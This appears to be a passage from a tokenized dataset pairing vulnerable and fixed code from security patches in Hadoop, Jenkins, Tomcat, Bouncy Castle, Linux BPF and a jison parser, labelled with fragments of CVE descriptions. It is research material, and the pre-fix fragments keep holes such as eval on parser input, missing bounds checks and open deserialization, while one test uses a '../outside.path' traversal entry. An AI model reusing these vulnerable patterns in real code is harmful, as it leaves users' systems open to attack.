"ansi", "-", "escapes", "-", "1", ".", "4", ".", "0", ".", "tgz", "\"", ",", "\"", "resolved", "\"", ":", "\"", "http", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "lodash", "/", "-/", "lodash", "-", "3", ".", "10", ".", "1", ".", "tgz", "\"", ",", "\"", "resolved", "\"", ":", "\"", "http", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "parse", "-", "asn1", "/", "-/", "parse", "-", "asn1", "-", "5", ".", "1", ".", "1", ".", "tgz", "\"", ",", "\"", "resolved", "\"", ":", "\"", "http", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "pify", "/", "-/", "pify", "-", "2", ".", "3", ".", "0", ".", "tgz", "\"", ",", "\"", "resolved", "\"", ":", "\"", "http", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "readable", "-", "stream", "/", "-/", "readable", "-", "stream", "-", "2", ".", "3", ".", "6", ".", "tgz", "\"", ",", "\"", "resolved", "\"", ":", "\"", "http", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "regexpp", "/", "-/", "regexpp", "-", "1", ".", "1", ".", "0", ".", "tgz", "\"", ",", "\"", "resolved", "\"", ":", "\"", "http", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "regjsgen", "/", "-/", "regjsgen", "-", "0", ".", "2", ".", "0", ".", "tgz", "\"", ",", "\"", "resolved", "\"", ":", "\"", "http", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "safe", "-", "regex", "/", "-/", "safe", "-", "regex", "-", "1", ".", "1", ".", "0", ".", "tgz", "\"", ",", "\"", "resolved", "\"", ":", "\"", "http", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "sha", ".", "js", "/", "-/", "sha", ".", "js", "-", "2", ".", "4", ".", "11", ".", "tgz", "\"", ",", "\"", "resolved", "\"", ":", "\"", "http", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "strip", "-", "ansi", "/", "-/", "strip", "-", "ansi", "-", "3", ".", "0", ".", "1", ".", "tgz", "\"", ",", "\"", "resolved", "\"", ":", "\"", "http", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "strip", "-", "eof", "/", "-/", "strip", "-", "eof", "-", "1", ".", "0", ".", "0", ".", "tgz", "\"", ",", "\"", "resolved", "\"", ":", "\"", "http", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "rimraf", "/", "-/", "rimraf", "-", "2", ".", "2", ".", "8", ".", "tgz", "\"", ",", "\"", "resolved", "\"", ":", "\"", "http", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "through", "/", "-/", "through", "-", "2", ".", "3", ".", "8", ".", "tgz", "\"", ",", "\"", "resolved", "\"", ":", "\"", "http", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "async", "/", "-/", "async", "-", "0", ".", "2", ".", "10", ".", "tgz", "\"", ",", "\"", "resolved", "\"", ":", "\"", "http", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "uuid", "/", "-/", "uuid", "-", "2", ".", "0", ".", "3", ".", "tgz", "\"", ",", "\"", "resolved", "\"", ":", "\"", "http", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "winston", "/", "-/", "winston", "-", "0", ".", "8", ".", "3", ".", "tgz", "\"", ",", "\"", "resolved", "\"", ":", "\"", "http", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "async", "/", "-/", "async", "-", "0", ".", "2", ".", "10", ".", "tgz", "\"", ",", "\"", "resolved", "\"", ":", "\"", "http", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "wrap", "-", "ansi", "/", "-/", "wrap", "-", "ansi", "-", "2", ".", "1", ".", "0", ".", "tgz", "\"", ",", "\"", "resolved", "\"", ":", "\"", "http", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "xmlbuilder", "/", "-/", "xmlbuilder", "-", "3", ".", "1", ".", "0", ".", "tgz", "\"", ",", "\"", "resolved", "\"", ":", "\"", "http", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "lodash", "/", "-/", "lodash", "-", "3", ".", "10", ".", "1", ".", "tgz", "\"", ",", "\"", "prepublish", "\"", ":", "\"", "npm", "run", "clean", "&", "&", "npm", "run", "check", "&", "&", "npm", "run", "build", "&", "&", "check", "-", "es3", "-", "syntax", "lib", "/", "dist", "/", "-", "-", "kill", "-", "-", "print", "\"", "\"", "@", "handsontable", "/", "formulajs", "\"", ":", "\"", "^", "2", ".", "0", ".", "0", "\"", ",", "var", "result", "=", "[", "];", "var", "arr", "=", "eval", "(", "\"[", "\"", "+", "yytext", "+", "\"", "]\"", ");", "arr", ".", "forEach", "(", "function", "(", "item", ")", "{", "result", ".", "push", "(", "item", ")", ";", "}", ");", "$", "$", "=", "result", ";", "/", "*", "parser", "generated", "by", "jison", "0", ".", "4", ".", "17", "*", "/", "var", "parser", "=", "{", "trace", ":", "function", "trace", "(", ")", "{", "}", ",", "var", "result", "=", "[", "];", "var", "arr", "=", "eval", "(", "\"[", "\"", "+", "yytext", "+", "\"", "]\"", ");", "arr", ".", "forEach", "(", "function", "(", "item", ")", "{", "result", ".", "push", "(", "item", ")", ";", "}", ");", "this", ".", "$", "=", "result", ";", "parseError", ":", "function", "parseError", "(", "str", ",", "hash", ")", "{", "function", "_parseError", "(", "msg", ",", "hash", ")", "{", "this", ".", "message", "=", "msg", ";", "this", ".", "hash", "=", "hash", ";", "}", "_parseError", ".", "prototype", "=", "Error", ";", "throw", "new", "_parseError", "(", "str", ",", "hash", ")", ";", "parse", ":", "function", "parse", "(", "input", ")", "{", "test_match", ":", "function", "(", "match", ",", "indexed_rule", ")", "{", "lex", ":", "function", "lex", "(", ")", "{", "begin", ":", "function", "begin", "(", "condition", ")", "{", "popState", ":", "function", "popState", "(", ")", "{", "_currentRules", ":", "function", "_currentRules", "(", ")", "{", "topState", ":", "function", "topState", "(", "n", ")", "{", "pushState", ":", "function", "pushState", "(", "condition", ")", "{", "if", "(", "typeof", "module", "!", "==", "'", "undefined", "'", "&", "&", "require", ".", "main", "=", "==", "module", ")", "{", "exports", ".", "main", "(", "process", ".", "argv", ".", "slice", "(", "1", ")", ");", "}"], "docstring_tokens": ["sending", "specially-crafted", "requests"]}
{"contents": ["empty"], "code_tokens": ["this", ".", "blocksRemaining", "=", "-", "2", ";", "/", "/", "page", "8", ",", "len", "(", "P", ")", "<", "=", "2", "^", "39", "-", "256", ",", "1", "block", "used", "by", "tag", "but", "done", "on", "J0", "blocksRemaining", "=", "-", "2", ";</s>this", ".", "blocksRemaining", "=", "-", "1", ";", "/", "/", "page", "8", ",", "len", "(", "P", ")", "<", "=", "2", "^", "39", "-", "256", "(", "1", "block", "used", "by", "tag", ")", "blocksRemaining", "=", "-", "1", ";"], "docstring_tokens": ["via", "a", "crafted", "application"]}
{"contents": ["empty"], "code_tokens": ["#", "##", "0", ".", "12", ".", "0", "Release", "date", ":", "Feb", "26", ",", "2018", "*", "[", "SECURITY", "-", "498", "]", "(", "https", ":", "//", "jenkins", ".", "io", "/", "security", "/", "advisory", "/", "2018", "-", "02", "-", "26", "/", "#", "SECURITY", "-", "498", ")", "-", "Users", "with", "_Item", "/", "Configure_", "and", "_Computer", "/", "Configure_", "permissions", "were", "able", "to", "change", "ownership", "from", "CLI", "or", "REST", "API", "without", "the", "_Manage", "Ownership_", "permissions", ".", "Compatibility", "notes", ":", "*", "External", "configuration", "management", "logic", "may", "fail", "if", "the", "client", "user", "has", "no", "_Overall", "/", "Administer_", "or", "_Manage", "Ownership_", "permission", ".", "*", "Folder", "ownership", "modifications", "from", "REST", "/", "CLI", "will", "fail", "for", "users", "who", "have", "no", "_Overall", "/", "Administer_", "perission", ".", "Re", "-", "enabling", "functionality", "for", "users", "with", "_Manage", "Ownership_", "permission", "is", "tracked", "as", "[", "JENKINS", "-", "49744", "]", "(", "https", ":", "//", "issues", ".", "jenkins", "-", "ci", ".", "org", "/", "browse", "/", "JENKINS", "-", "49744", ")", ".</s>"], "docstring_tokens": ["sending", "a", "specially-crafted", "request"]}
{"contents": ["empty"], "code_tokens": ["String", "targetDirPath", "=", "toDir", ".", "getCanonicalPath", "(", ")", "+", "File", ".", "separator", ";", "if", "(", "!", "file", ".", "getCanonicalPath", "(", ").", "startsWith", "(", "targetDirPath", ")", ")", "{", "throw", "new", "IOException", "(", "\"", "expanding", "\"", "+", "entry", ".", "getName", "(", ")", "+", "\"", "would", "create", "file", "outside", "of", "\"", "+", "toDir", ")", ";", "}", "import", "static", "org", ".", "junit", ".", "Assert", ".", "fail", ";", "import", "java", ".", "nio", ".", "charset", ".", "StandardCharsets", ";", "import", "java", ".", "util", ".", "jar", ".", "JarEntry", ";", "@", "Test", "public", "void", "testUnJar2", "(", ")", "throws", "IOException", "{", "/", "/", "make", "a", "simple", "zip", "File", "jarFile", "=", "new", "File", "(", "TEST_ROOT_DIR", ",", "TEST_JAR_NAME", ")", ";", "JarOutputStream", "jstream", "=", "new", "JarOutputStream", "(", "new", "FileOutputStream", "(", "jarFile", ")", ");", "JarEntry", "je", "=", "new", "JarEntry", "(", "\"", "META", "-", "INF", "/", "MANIFEST", ".", "MF", "\"", ");", "byte", "[", "]", "data", "=", "\"", "Manifest", "-", "Version", ":", "1", ".", "0", "\\", "nCreated", "-", "By", ":", "1", ".", "8", ".", "0_1", "(", "Manual", ")", "\"", ".", "getBytes", "(", "StandardCharsets", ".", "UTF_8", ")", ";", "je", ".", "setSize", "(", "data", ".", "length", ")", ";", "jstream", ".", "putNextEntry", "(", "je", ")", ";", "jstream", ".", "write", "(", "data", ")", ";", "jstream", ".", "closeEntry", "(", ");", "je", "=", "new", "JarEntry", "(", "\".", "./", "outside", ".", "path", "\"", ");", "data", "=", "\"", "any", "data", "here", "\"", ".", "getBytes", "(", "StandardCharsets", ".", "UTF_8", ")", ";", "je", ".", "setSize", "(", "data", ".", "length", ")", ";", "jstream", ".", "putNextEntry", "(", "je", ")", ";", "jstream", ".", "write", "(", "data", ")", ";", "jstream", ".", "closeEntry", "(", ");", "jstream", ".", "close", "(", ");", "File", "unjarDir", "=", "getUnjarDir", "(", "\"", "unjar", "-", "path", "\"", ");", "/", "/", "Unjar", "everything", "try", "{", "RunJar", ".", "unJar", "(", "jarFile", ",", "unjarDir", ")", ";", "fail", "(", "\"", "unJar", "should", "throw", "IOException", ".", "\")", ";", "}", "catch", "(", "IOException", "e", ")", "{", "GenericTestUtils", ".", "assertExceptionContains", "(", "\"", "would", "create", "file", "outside", "of", "\"", ",", "e", ")", ";", "}", "}</s>"], "docstring_tokens": ["the", "public", "archive"]}
{"contents": ["empty"], "code_tokens": ["char", "escapeCharacter", ";", "*", "@", "param", "value", "may", "be", "{", "@", "literal", "null", "}", ".", "return", "value", "=", "=", "null", "/", "/", "?", "null", "/", "/", ":", "TO_REPLACE", ".", "stream", "(", ")", "/", "/", ".", "reduce", "(", "value", ",", "(", "it", ",", "character", ")", "-", ">", "it", ".", "replace", "(", "character", ",", "this", ".", "escapeCharacter", "+", "character", ")", ");", "Predicate", "like", "=", "builder", ".", "like", "(", "propertyExpression", ",", "parameterExpression", ",", "escape", ".", "getEscapeCharacter", "(", "))", ";", "import", "lombok", ".", "RequiredArgsConstructor", ";", "private", "final", "JpaRootObject", "root", ";", "this", ".", "root", "=", "JpaRootObject", ".", "of", "(", "EscapeCharacter", ".", "of", "(", "escapeCharacter", ")", ");", "return", "root", ";", "}", "@", "RequiredArgsConstructor", "(", "staticName", "=", "\"", "of", "\"", ")", "public", "static", "class", "JpaRootObject", "{", "private", "final", "EscapeCharacter", "character", ";", "/", "**", "*", "Escapes", "the", "given", "source", "{", "@", "link", "String", "}", "for", "LIKE", "expressions", ".", "*", "*", "@", "param", "source", "can", "be", "{", "@", "literal", "null", "}", ".", "*", "@", "return", "*", "@", "see", "EscapeCharacter", "#", "escape", "(", "String", ")", "*", "/", "public", "String", "escape", "(", "String", "source", ")", "{", "return", "character", ".", "escape", "(", "source", ")", ";", "}", "/", "**", "*", "Returns", "the", "escape", "character", "being", "used", "to", "escape", "special", "characters", "for", "LIKE", "expressions", ".", "*", "*", "@", "return", "*", "/", "public", "char", "escapeCharacter", "(", ")", "{", "return", "character", ".", "getEscapeCharacter", "(", ");", "}</s>char", "value", ";", "*", "@", "param", "value", "May", "be", "{", "@", "literal", "null", "}", ".", "if", "(", "value", "=", "=", "null", ")", "{", "return", "null", ";", "}", "return", "TO_REPLACE", ".", "stream", "(", ")", "/", "/", ".", "reduce", "(", "value", ",", "(", "it", ",", "character", ")", "-", ">", "it", ".", "replace", "(", "character", ",", "this", ".", "value", "+", "character", ")", ");", "}", "/", "**", "*", "Makes", "the", "underlying", "character", "available", ".", "*", "*", "@", "return", "the", "value", "*", "/", "public", "char", "escapeCharacter", "(", ")", "{", "return", "value", ";", "Predicate", "like", "=", "builder", ".", "like", "(", "propertyExpression", ",", "parameterExpression", ",", "escape", ".", "getValue", "(", "))", ";", "private", "final", "EscapeCharacter", "character", ";", "this", ".", "character", "=", "EscapeCharacter", ".", "of", "(", "escapeCharacter", ")", ";", "return", "character", ";"], "docstring_tokens": ["using", "a", "specially-crafted", "query"]}
{"contents": ["empty"], "code_tokens": ["import", "java", ".", "util", ".", "HashSet", ";", "import", "java", ".", "util", ".", "Set", ";", "private", "static", "final", "Set", "<", "String", ">", "components", "=", "new", "HashSet", "<", ">(", ");", "static", "{", "components", ".", "add", "(", "\"", "java", ".", "util", ".", "TreeMap", "\"", ");", "components", ".", "add", "(", "\"", "java", ".", "lang", ".", "Integer", "\"", ");", "components", ".", "add", "(", "\"", "java", ".", "lang", ".", "Number", "\"", ");", "components", ".", "add", "(", "\"", "org", ".", "bouncycastle", ".", "pqc", ".", "crypto", ".", "xmss", ".", "BDS", "\"", ");", "components", ".", "add", "(", "\"", "java", ".", "util", ".", "ArrayList", "\"", ");", "components", ".", "add", "(", "\"", "org", ".", "bouncycastle", ".", "pqc", ".", "crypto", ".", "xmss", ".", "XMSSNode", "\"", ");", "components", ".", "add", "(", "\"[", "B", "\"", ");", "components", ".", "add", "(", "\"", "java", ".", "util", ".", "LinkedList", "\"", ");", "components", ".", "add", "(", "\"", "java", ".", "util", ".", "Stack", "\"", ");", "components", ".", "add", "(", "\"", "java", ".", "util", ".", "Vector", "\"", ");", "components", ".", "add", "(", "\"[", "Ljava", ".", "lang", ".", "Object", ";", "\")", ";", "components", ".", "add", "(", "\"", "org", ".", "bouncycastle", ".", "pqc", ".", "crypto", ".", "xmss", ".", "BDSTreeHash", "\"", ");", "}", "else", "{", "if", "(", "!", "components", ".", "contains", "(", "desc", ".", "getName", "(", "))", ")", "{", "throw", "new", "InvalidClassException", "(", "\"", "unexpected", "class", ":", "\"", ",", "desc", ".", "getName", "(", "))", ";", "}", "}</s>"], "docstring_tokens": ["via", "A", "handcrafted", "private", "key", "can", "include", "references", "to", "unexpected", "classes", "which", "will", "be", "picked", "up", "from", "the", "class", "path", "for", "the", "executing", "application", "."]}
{"contents": ["empty"], "code_tokens": ["assoc", "=", "(", "src", "+", "req", "-", ">", "cryptlen", ")", ";", "scatterwalk_map_and_copy", "(", "dst", ",", "req", "-", ">", "dst", ",", "0", ",", "tempCipherLen", ",", "1", ")", ";</s>assoc", "=", "(", "src", "+", "req", "-", ">", "cryptlen", "+", "auth_tag_len", ")", ";", "scatterwalk_map_and_copy", "(", "dst", ",", "req", "-", ">", "dst", ",", "0", ",", "req", "-", ">", "cryptlen", ",", "1", ")", ";"], "docstring_tokens": ["sticking", "plasters", "on", "the", "bleeding", "stump", "of", "a", "severed", "limb"]}
{"contents": ["empty"], "code_tokens": ["#", "define", "BPF_MAX_VAR_OFF", "(", "1", "<", "<", "29", ")", "#", "define", "BPF_MAX_VAR_SIZ", "(", "1", "<", "<", "29", ")", "static", "bool", "check_reg_sane_offset", "(", "struct", "bpf_verifier_env", "*", "env", ",", "const", "struct", "bpf_reg_state", "*", "reg", ",", "enum", "bpf_reg_type", "type", ")", "{", "bool", "known", "=", "tnum_is_const", "(", "reg", "-", ">", "var_off", ")", ";", "s64", "val", "=", "reg", "-", ">", "var_off", ".", "value", ";", "s64", "smin", "=", "reg", "-", ">", "smin_value", ";", "if", "(", "known", "&", "&", "(", "val", ">", "=", "BPF_MAX_VAR_OFF", "|", "|", "val", "<", "=", "-", "BPF_MAX_VAR_OFF", ")", ")", "{", "verbose", "(", "env", ",", "\"", "math", "between", "%", "s", "pointer", "and", "%", "lld", "is", "not", "allowed", "\\", "n", "\"", ",", "reg_type_str", "[", "type", "]", ",", "val", ")", ";", "return", "false", ";", "}", "if", "(", "reg", "-", ">", "off", ">", "=", "BPF_MAX_VAR_OFF", "|", "|", "reg", "-", ">", "off", "<", "=", "-", "BPF_MAX_VAR_OFF", ")", "{", "verbose", "(", "env", ",", "\"", "%", "s", "pointer", "offset", "%", "d", "is", "not", "allowed", "\\", "n", "\"", ",", "reg_type_str", "[", "type", "]", ",", "reg", "-", ">", "off", ")", ";", "return", "false", ";", "}", "if", "(", "smin", "=", "=", "S64_MIN", ")", "{", "verbose", "(", "env", ",", "\"", "math", "between", "%", "s", "pointer", "and", "register", "with", "unbounded", "min", "value", "is", "not", "allowed", "\\", "n", "\"", ",", "reg_type_str", "[", "type", "]", ");", "return", "false", ";", "}", "if", "(", "smin", ">", "=", "BPF_MAX_VAR_OFF", "|", "|", "smin", "<", "=", "-", "BPF_MAX_VAR_OFF", ")", "{", "verbose", "(", "env", ",", "\"", "value", "%", "lld", "makes", "%", "s", "pointer", "be", "out", "of", "bounds", "\\", "n", "\"", ",", "smin", ",", "reg_type_str", "[", "type", "]", ");", "return", "false", ";", "}", "return", "true", ";", "}", "if", "(", "!", "check_reg_sane_offset", "(", "env", ",", "off_reg", ",", "ptr_reg", "-", ">", "type", ")", "|", "|", "!", "check_reg_sane_offset", "(", "env", ",", "ptr_reg", ",", "ptr_reg", "-", ">", "type", ")", ")", "return", "-", "EINVAL", ";", "if", "(", "!", "check_reg_sane_offset", "(", "env", ",", "dst_reg", ",", "ptr_reg", "-", ">", "type", ")", ")", "return", "-", "EINVAL", ";", "if", "(", "!", "src_known", "&", "&", "opcode", "!", "=", "BPF_ADD", "&", "&", "opcode", "!", "=", "BPF_SUB", "&", "&", "opcode", "!", "=", "BPF_AND", ")", "{", "__mark_reg_unknown", "(", "dst_reg", ")", ";", "return", "0", ";", "}</s>#", "define", "BPF_MAX_VAR_OFF", "(", "1ULL", "<", "<", "31", ")", "#", "define", "BPF_MAX_VAR_SIZ", "INT_MAX"], "docstring_tokens": ["sending", "a", "specially-crafted", "request"]}
{"contents": ["empty"], "code_tokens": ["*", ".", "class", "@", "@", "-", "185", ",", "10", "+", "185", ",", "11", "@", "@", "public", "int", "encryptWithAd", "(", "byte", "[", "]", "ad", ",", "byte", "[", "]", "plaintext", ",", "int", "plaintextOffset", ",", "if", "(", "ciphertextOffset", "<", "0", "|", "|", "ciphertextOffset", ">", "ciphertext", ".", "length", ")", "throw", "new", "IllegalArgumentException", "(", ");", "if", "(", "length", "<", "0", "|", "|", "plaintextOffset", "<", "0", "|", "|", "plaintextOffset", ">", "plaintext", ".", "length", ")", "throw", "new", "IllegalArgumentException", "(", ");", "space", "=", "ciphertext", ".", "length", "-", "ciphertextOffset", ";", "if", "(", "ciphertextOffset", "<", "0", "|", "|", "ciphertextOffset", ">", "ciphertext", ".", "length", ")", "throw", "new", "IllegalArgumentException", "(", ");", "if", "(", "length", "<", "0", "|", "|", "plaintextOffset", "<", "0", "|", "|", "plaintextOffset", ">", "plaintext", ".", "length", ")", "throw", "new", "IllegalArgumentException", "(", ");", "space", "=", "plaintext", ".", "length", "-", "plaintextOffset", ";", "if", "(", "ciphertextOffset", "<", "0", "|", "|", "ciphertextOffset", ">", "ciphertext", ".", "length", ")", "throw", "new", "IllegalArgumentException", "(", ");", "if", "(", "length", "<", "0", "|", "|", "plaintextOffset", "<", "0", "|", "|", "plaintextOffset", ">", "plaintext", ".", "length", ")", "throw", "new", "IllegalArgumentException", "(", ");", "space", "=", "ciphertext", ".", "length", "-", "ciphertextOffset", ";", "if", "(", "ciphertextOffset", "<", "0", "|", "|", "ciphertextOffset", ">", "ciphertext", ".", "length", ")", "throw", "new", "IllegalArgumentException", "(", ");", "if", "(", "length", "<", "0", "|", "|", "plaintextOffset", "<", "0", "|", "|", "plaintextOffset", ">", "plaintext", ".", "length", ")", "throw", "new", "IllegalArgumentException", "(", ");", "space", "=", "plaintext", ".", "length", "-", "plaintextOffset", ";", "if", "(", "ciphertextOffset", "<", "0", "|", "|", "ciphertextOffset", ">", "ciphertext", ".", "length", ")", "throw", "new", "IllegalArgumentException", "(", ");", "if", "(", "length", "<", "0", "|", "|", "plaintextOffset", "<", "0", "|", "|", "plaintextOffset", ">", "plaintext", ".", "length", ")", "throw", "new", "IllegalArgumentException", "(", ");", "space", "=", "ciphertext", ".", "length", "-", "ciphertextOffset", ";", "if", "(", "ciphertextOffset", "<", "0", "|", "|", "ciphertextOffset", ">", "ciphertext", ".", "length", ")", "throw", "new", "IllegalArgumentException", "(", ");", "if", "(", "length", "<", "0", "|", "|", "plaintextOffset", "<", "0", "|", "|", "plaintextOffset", ">", "plaintext", ".", "length", ")", "throw", "new", "IllegalArgumentException", "(", ");", "space", "=", "plaintext", ".", "length", "-", "plaintextOffset", ";", "*", "@", "throws", "IllegalArgumentException", "One", "of", "the", "parameters", "is", "out", "of", "range", ".", "*", "*", "@", "throws", "IllegalArgumentException", "One", "of", "the", "parameters", "is", "out", "of", "range", ".", "*</s>if", "(", "ciphertextOffset", ">", "ciphertext", ".", "length", ")", "space", "=", "0", ";", "else", "space", "=", "ciphertext", ".", "length", "-", "ciphertextOffset", ";", "if", "(", "ciphertextOffset", ">", "ciphertext", ".", "length", ")", "space", "=", "0", ";", "if", "(", "plaintextOffset", ">", "plaintext", ".", "length", ")", "space", "=", "0", ";", "else", "space", "=", "plaintext", ".", "length", "-", "plaintextOffset", ";", "if", "(", "ciphertextOffset", ">", "ciphertext", ".", "length", ")", "space", "=", "0", ";", "else", "space", "=", "ciphertext", ".", "length", "-", "ciphertextOffset", ";", "if", "(", "ciphertextOffset", ">", "ciphertext", ".", "length", ")", "space", "=", "0", ";", "if", "(", "plaintextOffset", ">", "plaintext", ".", "length", ")", "space", "=", "0", ";", "else", "space", "=", "plaintext", ".", "length", "-", "plaintextOffset", ";", "if", "(", "ciphertextOffset", ">", "ciphertext", ".", "length", ")", "space", "=", "0", ";", "else", "space", "=", "ciphertext", ".", "length", "-", "ciphertextOffset", ";", "if", "(", "ciphertextOffset", ">", "ciphertext", ".", "length", ")", "space", "=", "0", ";", "if", "(", "plaintextOffset", ">", "plaintext", ".", "length", ")", "space", "=", "0", ";", "else", "space", "=", "plaintext", ".", "length", "-", "plaintextOffset", ";"], "docstring_tokens": ["sending", "a", "specially-crafted", "request"]}
{"contents": ["empty"], "code_tokens": ["}", "else", "memset", "(", "kdata", ",", "0", ",", "_IOC_SIZE", "(", "cmd", ")", ");</s>}"], "docstring_tokens": ["by", "requesting", "a", "large", "memory-allocation", "amount", "."]}
{"contents": ["empty"], "code_tokens": ["throw", "new", "ConnectionException", "(", "sm", ".", "getString", "(", "\"", "upgradeHandler", ".", "tooMuchOverhead", "\"", ",", "connectionId", ")", ",", "Http2Error", ".", "ENHANCE_YOUR_CALM", ")", ";", "upgradeHandler", ".", "tooMuchOverhead", "=", "Connection", "[", "{", "0", "}", "],", "Too", "much", "overhead", "so", "the", "connection", "will", "be", "closed</s>throw", "new", "ConnectionException", "(", "\"", "Too", "much", "overhead", "\"", ",", "Http2Error", ".", "ENHANCE_YOUR_CALM", ")", ";"], "docstring_tokens": ["sending", "excessive", "SETTINGS", "frames"]}
{"contents": ["empty"], "code_tokens": ["import", "org", ".", "kohsuke", ".", "stapler", ".", "interceptor", ".", "RequirePOST", ";", "import", "org", ".", "kohsuke", ".", "accmod", ".", "Restricted", ";", "import", "org", ".", "kohsuke", ".", "accmod", ".", "restrictions", ".", "DoNotUse", ";", "@", "RequirePOST", "@", "Restricted", "(", "DoNotUse", ".", "class", ")", "/", "/", "WebOnly", "Jenkins", ".", "getActiveInstance", "(", ").", "checkPermission", "(", "Jenkins", ".", "ADMINISTER", ")", ";</s>"], "docstring_tokens": ["using", "a", "specially-crafted", "argument"]}
{"contents": ["empty"], "code_tokens": [".", "Fixed", "bug", "#", "54061", "(", "Memory", "leaks", "when", "openssl_decrypt", ")", ".", "(", "Pierre", ")", "EVP_CIPHER_CTX_cleanup", "(", "&", "cipher_ctx", ")", ";</s>-", "Exif", "extension", ":", "-", "OpenSSL", "extension", ":", "-", "SPL", "extension", ":"], "docstring_tokens": ["using", "plaintext", "data"]}
{"contents": ["empty"], "code_tokens": ["enum", "State", "{", "INITIAL", ",", "CHALLENGE_SENT", ",", "COMPLETE", "}", "private", "volatile", "State", "_state", "=", "State", ".", "INITIAL", ";", "if", "(", "_state", "=", "=", "State", ".", "COMPLETE", ")", "new", "IllegalStateException", "(", "\"", "Multiple", "Authentications", "not", "permitted", ".", "\")", ");", "else", "if", "(", "_state", "=", "=", "State", ".", "INITIAL", "&", "&", "(", "response", "=", "=", "null", "|", "|", "response", ".", "length", "=", "=", "0", ")", ")", "{", "_state", "=", "State", ".", "CHALLENGE_SENT", ";", "return", "new", "AuthenticationResult", "(", "new", "byte", "[", "0", "]", ",", "AuthenticationResult", ".", "AuthenticationStatus", ".", "CONTINUE", ")", ";", "}", "_state", "=", "State", ".", "COMPLETE", ";", "if", "(", "response", "=", "=", "null", "|", "|", "response", ".", "length", "=", "=", "0", ")", "return", "new", "AuthenticationResult", "(", "AuthenticationResult", ".", "AuthenticationStatus", ".", "ERROR", ",", "new", "IllegalArgumentException", "(", "\"", "Invalid", "OAuth2", "client", "response", ".", "\")", ");", "enum", "State", "{", "INITIAL", ",", "CHALLENGE_SENT", ",", "COMPLETE", "}", "private", "volatile", "State", "_state", "=", "State", ".", "INITIAL", ";", "if", "(", "_state", "=", "=", "State", ".", "COMPLETE", ")", "new", "IllegalStateException", "(", "\"", "Multiple", "Authentications", "not", "permitted", ".", "\")", ");", "}", "else", "if", "(", "_state", "=", "=", "State", ".", "INITIAL", "&", "&", "(", "response", "=", "=", "null", "|", "|", "response", ".", "length", "=", "=", "0", ")", ")", "{", "_state", "=", "State", ".", "CHALLENGE_SENT", ";", "return", "new", "AuthenticationResult", "(", "new", "byte", "[", "0", "]", ",", "AuthenticationResult", ".", "AuthenticationStatus", ".", "CONTINUE", ")", ";", "_state", "=", "State", ".", "COMPLETE", ";", "if", "(", "response", "=", "=", "null", "|", "|", "response", ".", "length", "=", "=", "0", ")", "return", "new", "AuthenticationResult", "(", "AuthenticationResult", ".", "AuthenticationStatus", ".", "ERROR", ",", "new", "IllegalArgumentException", "(", "\"", "Invalid", "PLAIN", "encoding", ",", "authzid", "null", "terminator", "not", "found", "\"", "))", ";", "import", "static", "org", ".", "junit", ".", "Assert", ".", "assertArrayEquals", ";", "public", "void", "testHandleNoInitialResponse", "(", ")", "throws", "Exception", "{", "final", "AuthenticationResult", "result", "=", "_negotiator", ".", "handleResponse", "(", "new", "byte", "[", "0", "]", ");", "assertEquals", "(", "\"", "Unexpected", "authentication", "status", "\"", ",", "AuthenticationResult", ".", "AuthenticationStatus", ".", "CONTINUE", ",", "result", ".", "getStatus", "(", "))", ";", "assertArrayEquals", "(", "\"", "Unexpected", "authentication", "challenge", "\"", ",", "new", "byte", "[", "0", "]", ",", "result", ".", "getChallenge", "(", "))", ";", "}", "public", "void", "testHandleNoInitialResponseNull", "(", ")", "throws", "Exception", "{", "final", "AuthenticationResult", "result", "=", "_negotiator", ".", "handleResponse", "(", "null", ")", ";", "assertEquals", "(", "\"", "Unexpected", "authentication", "status", "\"", ",", "AuthenticationResult", ".", "AuthenticationStatus", ".", "CONTINUE", ",", "result", ".", "getStatus", "(", "))", ";", "assertArrayEquals", "(", "\"", "Unexpected", "authentication", "challenge", "\"", ",", "new", "byte", "[", "0", "]", ",", "result", ".", "getChallenge", "(", "))", ";", "}", "import", "static", "org", ".", "junit", ".", "Assert", ".", "assertArrayEquals", ";", "public", "void", "testHandleNoInitialResponse", "(", ")", "throws", "Exception", "{", "final", "AuthenticationResult", "result", "=", "_negotiator", ".", "handleResponse", "(", "new", "byte", "[", "0", "]", ");", "assertEquals", "(", "\"", "Unexpected", "authentication", "status", "\"", ",", "AuthenticationResult", ".", "AuthenticationStatus", ".", "CONTINUE", ",", "result", ".", "getStatus", "(", "))", ";", "assertArrayEquals", "(", "\"", "Unexpected", "authentication", "challenge", "\"", ",", "new", "byte", "[", "0", "]", ",", "result", ".", "getChallenge", "(", "))", ";", "final", "AuthenticationResult", "firstResult", "=", "_negotiator", ".", "handleResponse", "(", "VALID_RESPONSE", ".", "getBytes", "(", "))", ";", "assertEquals", "(", "\"", "Unexpected", "first", "authentication", "result", "\"", ",", "_expectedResult", ",", "firstResult", ")", ";", "}", "public", "void", "testHandleNoInitialResponseNull", "(", ")", "throws", "Exception", "{", "final", "AuthenticationResult", "result", "=", "_negotiator", ".", "handleResponse", "(", "null", ")", ";", "assertEquals", "(", "\"", "Unexpected", "authentication", "status", "\"", ",", "AuthenticationResult", ".", "AuthenticationStatus", ".", "CONTINUE", ",", "result", ".", "getStatus", "(", "))", ";", "assertArrayEquals", "(", "\"", "Unexpected", "authentication", "challenge", "\"", ",", "new", "byte", "[", "0", "]", ",", "result", ".", "getChallenge", "(", "))", ";", "final", "AuthenticationResult", "firstResult", "=", "_negotiator", ".", "handleResponse", "(", "VALID_RESPONSE", ".", "getBytes", "(", "))", ";", "assertEquals", "(", "\"", "Unexpected", "first", "authentication", "result", "\"", ",", "_expectedResult", ",", "firstResult", ")", ";", "}</s>private", "volatile", "boolean", 